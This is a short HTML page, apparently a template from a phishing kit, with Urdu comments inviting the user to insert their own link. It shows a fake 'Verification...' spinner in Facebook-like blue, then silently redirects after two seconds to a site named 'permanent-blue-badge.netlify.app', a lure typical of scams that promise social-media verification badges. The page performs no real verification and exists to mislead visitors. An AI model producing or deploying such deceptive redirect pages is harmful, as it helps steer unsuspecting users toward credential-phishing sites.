
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      background: #ffffff;
      font-family: "Segoe UI", Arial, sans-serif;
    }

    /* Loader (small professional) */
    .loader {
      border: 4px solid #e0e0e0;
      border-top: 4px solid #1877f2;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 12px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Text */
    .text {
      font-size: 14px;
      color: #444;
      font-weight: 500;
      letter-spacing: 0.5px;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">Verification...</div>

  <script>
    // 2 سیکنڈ بعد ری ڈائریکٹ
    setTimeout(function(){
      window.location.href = "https://permanent-blue-badge.netlify.app/"; // اپنا لنک یہاں ڈالیں
    }, 2000);
  </script>
</body>
</html>
